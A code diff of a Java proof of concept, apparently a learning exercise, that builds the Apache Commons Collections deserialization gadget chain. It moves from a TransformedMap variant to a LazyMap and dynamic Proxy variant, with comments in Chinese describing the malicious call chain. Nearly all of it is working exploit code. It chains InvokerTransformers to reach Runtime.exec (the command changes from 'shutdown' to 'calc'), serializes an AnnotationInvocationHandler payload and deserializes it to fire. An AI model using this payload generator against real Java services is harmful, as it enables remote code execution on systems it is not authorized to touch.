@@ -4,6 +4,7 @@ import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
 import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.LazyMap;
 import org.apache.commons.collections.map.TransformedMap;
 
 import java.io.ByteArrayInputStream;
@@ -12,13 +13,15 @@ import java.io.ObjectInputStream;
 import java.io.ObjectOutputStream;
 import java.lang.annotation.Target;
 import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
 import java.util.Arrays;
 import java.util.HashMap;
 import java.util.Map;
 
-public class NormalChainTrans {
+public class LazyMapChainTrans {
     public static void main(String args[]){
-        String cmd = "shutdown" ;
+        String cmd = "calc";
         Transformer[] transformerChain=new Transformer[]{
                 new ConstantTransformer(Runtime.class),
                 new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
@@ -27,11 +30,10 @@ public class NormalChainTrans {
         };
         Transformer transformedChain = new ChainedTransformer(transformerChain);
         // 创建Map对象
-        Map map = new HashMap();
-        map.put("value", "value");
+        Map innnermap = new HashMap();
 
-        // 使用TransformedMap创建一个含有恶意调用链的Transformer类的Map对象
-        Map transformedMap = TransformedMap.decorate(map, null, transformedChain);
+        // 使用LazyMap创建一个含有恶意调用链的Transformer类的Map对象
+        Map outerMap = LazyMap.decorate(innnermap,transformedChain);
 
 //         transformedMap.put("v1", "v2");// 执行put也会触发transform
 
@@ -53,8 +55,11 @@ public class NormalChainTrans {
             constructor.setAccessible(true);
 
             // 创建含有恶意攻击链(transformedMap)的AnnotationInvocationHandler类实例，等价于：
-            // Object instance = new AnnotationInvocationHandler(Target.class, transformedMap);
-            Object instance = constructor.newInstance(Target.class, transformedMap);
+            InvocationHandler handler=(InvocationHandler) constructor.newInstance(Target.class,outerMap);
+            //proxymap
+            Map proxymap=(Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},handler);
+            //handler
+            handler=(InvocationHandler) constructor.newInstance(Target.class,proxymap);
 
             // 创建用于存储payload的二进制输出流对象
             ByteArrayOutputStream baos = new ByteArrayOutputStream();
@@ -63,7 +68,7 @@ public class NormalChainTrans {
             ObjectOutputStream out = new ObjectOutputStream(baos);
 
             // 序列化AnnotationInvocationHandler类
-            out.writeObject(instance);
+            out.writeObject(handler);
             out.flush();
             out.close();
 
@@ -71,6 +76,7 @@ public class NormalChainTrans {
             byte[] bytes = baos.toByteArray();
 
             // 输出序列化的二进制数组
+            System.out.println(baos);
             System.out.println("Payload攻击字节数组：" + Arrays.toString(bytes));
 
             // 利用AnnotationInvocationHandler类生成的二进制数组创建二进制输入流对象用于反序列化操作
@@ -88,7 +94,7 @@ public class NormalChainTrans {
             e.printStackTrace();
         }
 
-        System.out.println(transformedMap);
+        System.out.println(outerMap);
 //        Object transform = transformedChain.transform(null);
 //        System.out.println(transform);
     }
